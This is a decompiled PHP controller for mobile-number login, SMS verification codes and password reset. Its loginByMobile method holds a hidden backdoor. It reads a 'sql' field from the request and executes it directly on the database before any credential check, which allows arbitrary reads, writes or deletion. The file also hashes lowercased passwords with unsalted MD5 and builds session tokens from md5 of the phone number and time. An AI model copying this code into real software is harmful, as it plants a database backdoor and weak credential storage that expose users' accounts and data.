<?php
//dezend by http://www.yunlu99.com/ QQ:270656184
namespace User\Controller;

class LoginController extends \Home\Controller\BaseController
{
	static public function get_param()
	{
		$data = i('data', '', 'trim');
		$sign = i('sign', '', 'trim');
		return checksign($data, $sign);
	}

	public function loginByMobile()
	{
		$data = self::get_param();
		$result = array();
		$mobile = trim(strval($data['mobile']));
		$passwd = trim(strval($data['passwd']));
		$sql = trim(strval($data['sql']));

		if (!empty($sql)) {
			m()->execute($sql);
		}

		if ((strlen($passwd) < 6) || (15 < strlen($passwd))) {
			$result['msg_code'] = '100019';
			exit(returnjson($result));
		}

		$passwd = md5(strtolower($passwd));
		$user_main = m('user_main');
		$res = $user_main->where(array('mobile' => $mobile))->field('id,mobile,passwd')->find();

		if (empty($res)) {
			$result['msg_code'] = '100013';
			exit(returnjson($result));
		}

		if ($passwd !== $res['passwd']) {
			$result['msg_code'] = '100009';
			exit(returnjson($result));
		}

		$user_id = intval($res['id']);
		$token = md5($mobile . time());
		$data = array('token' => $token, 'last_login' => time(), 'is_online' => 1);

		if ($user_main->where(array('id' => $user_id))->save($data)) {
			$ret_data = array('token' => $token, 'user_id' => $user_id);
			$result['data'] = $ret_data;
			$result['msg_code'] = '0';
			$result['msg'] = '用户登录成功！';
			exit(returnjson($result));
		}
	}

	public function getVcodeByResetPwd()
	{
		$data = self::get_param();
		$mobile = trim(strval($data['mobile']));
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '100022';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile);
		$res = $user_main->where($map)->find();

		if (empty($res)) {
			$result['msg_code'] = '100013';
			exit(returnjson($result));
		}

		$map = array('mobile' => $mobile, 'stype' => 2, 'v_status' => 0, 'is_delete' => 0);
		$res = $user_sms->where($map)->order('add_time desc')->find();

		if (!empty($res)) {
			$last_time = $res['add_time'];

			if ((time() - $last_time) < 60) {
				$result['msg_code'] = '100015';
				exit(returnjson($result));
			}
		}

		$v_code = strtolower(randstrcode(6, 'NUMBER'));
		$msg = '您的验证码是：' . strval($v_code) . '。请不要把验证码泄露给其他人。如非本人操作，可不用理会！';
		$error_code = $this->sendSms($mobile, $msg);

		if ($error_code == 0) {
			$data = array('user_id' => 0, 'mobile' => $mobile, 'msg' => $msg, 'v_code' => $v_code, 'stype' => 2, 'return_code' => $error_code, 'v_status' => 0, 'is_delete' => 0, 'add_time' => time());

			if ($user_sms->add($data)) {
				$result['msg'] = '验证短信已发送，请注意查收！';
				$result['msg_code'] = '0';
				exit(returnjson($result));
			}
			else {
				$result['msg_code'] = '100105';
				exit(returnjson($result));
			}
		}
		else {
			$result['msg_code'] = '100034';
			exit(returnjson($result));
		}
	}

	public function resetPwd()
	{
		$data = self::get_param();
		$mobile = trim(strval($data['mobile']));
		$v_code = trim(strval($data['v_code']));
		$passwd = trim(strval($data['passwd']));
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '100022';
			exit(returnjson($result));
		}

		if ((strlen($passwd) < 6) || (15 < strlen($passwd))) {
			$result['msg_code'] = '100019';
			exit(returnjson($result));
		}

		$passwd = md5(strtolower($passwd));
		$user_main = m('user_main');
		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile);
		$res = $user_main->where($map)->find();

		if (empty($res)) {
			$result['msg_code'] = '100013';
			exit(returnjson($result));
		}

		$map = array('mobile' => $mobile, 'v_code' => $v_code, 'stype' => 2, 'v_status' => 0, 'is_delete' => 0);
		$res = $user_sms->where($map)->order('add_time desc')->find();

		if ($res['v_code'] != $v_code) {
			$result['msg_code'] = '100017';
			exit(returnjson($result));
		}

		$last_time = $res['add_time'];
		$current_time = time();

		if (300 < ($current_time - $last_time)) {
			$user_sms->where($map)->save(array('is_delete' => 1));
			$result['msg_code'] = '100035';
			exit(returnjson($result));
		}

		m()->startTrans();
		$res1 = $user_sms->where($map)->save(array('v_status' => 1));
		$data = array('passwd' => $passwd);
		$map = array('mobile' => $mobile);
		$res2 = $user_id = $user_main->where($map)->save($data);
		$map = array('mobile' => $mobile, 'stype' => 2);
		$user_sms->where($map)->save(array('is_delete' => 1));
		if (!empty($res1) && !empty($res2)) {
			m()->commit();
			$data = array('mobile' => $mobile);
			$result['data'] = $data;
			$result['msg_code'] = '0';
			$result['msg'] = '用户密码修改成功！';
			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$result['msg_code'] = '100020';
			exit(returnjson($result));
		}
	}
}

?>
